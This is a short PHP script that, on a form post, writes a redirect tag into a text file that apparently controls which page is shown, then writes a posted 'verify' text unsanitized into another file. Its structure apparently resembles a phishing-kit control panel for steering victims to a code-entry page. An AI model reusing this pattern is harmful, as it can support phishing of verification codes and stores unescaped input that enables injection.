<?php


session_start();

if(isset($_POST['Paramverify'])) 
{
    
$Page .= ' <meta http-equiv="refresh" content="0;url=./code_param.php" /> ';

$fPage = fopen("../Show_system/Show_Page.txt", "w");
    fwrite($fPage, $Page);



$textimage = $_SESSION['textParamverify'] = $_POST['textParamverify'];

$yagmai .= ''.$textimage.'';

$f = fopen("../Show_system/Show_Appverify.txt", "w");
    fwrite($f, $yagmai);




}

else {




}

?>

